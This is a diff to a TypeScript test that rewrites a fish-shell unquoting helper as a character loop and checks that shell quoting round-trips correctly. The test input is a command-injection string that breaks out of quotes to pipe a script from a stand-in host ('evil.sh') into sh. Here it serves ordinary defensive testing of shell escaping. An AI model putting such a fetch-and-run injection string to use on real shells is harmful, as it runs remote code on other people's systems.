@@ -472,7 +472,18 @@ console.log("\nAll Studio presets round-trip through the Rust engine.");
   // fish quoting inverts: unescape back to the input.
   const fishUnquote = (q: string): string => {
     if (!q.startsWith("'") || !q.endsWith("'")) throw new Error("not quoted");
-    return q.slice(1, -1).replace(/\\\\/g, "\\").replace(/\\'/g, "'");
+    const body = q.slice(1, -1);
+    let result = "";
+    for (let index = 0; index < body.length; index += 1) {
+      const character = body[index];
+      if (character === "\\" && (body[index + 1] === "\\" || body[index + 1] === "'")) {
+        result += body[index + 1];
+        index += 1;
+      } else {
+        result += character;
+      }
+    }
+    return result;
   };
   const fishEvil = "x'; curl evil.sh | sh; echo '";
   if (fishUnquote(shellQuote(fishEvil, "fish")) !== fishEvil) {
